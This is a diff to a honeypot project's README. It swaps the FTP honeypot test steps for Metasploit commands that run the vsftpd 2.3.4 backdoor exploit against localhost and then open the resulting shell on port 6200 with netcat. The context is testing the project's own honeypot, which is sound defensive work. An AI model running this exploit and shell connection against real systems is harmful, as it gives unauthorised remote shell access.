@@ -62,10 +62,10 @@ http://127.0.0.1/sql_login
 
 **All detected HTTP attacks are logged in:logs/attacks.log **
 3/ FTP Honeypot
-ftp 127.0.0.1
-**View logs
-All captured activity is stored in:
-logs/attacks.log
-**Stop the honeypot
-Ctrl+C
+msfconsole -q
+use exploit/unix/ftp/vsftpd_234_backdoor.
+set RHOSTS 127.0.0.1
+nc 127.0.0.1 6200
+ls
+pwd
 
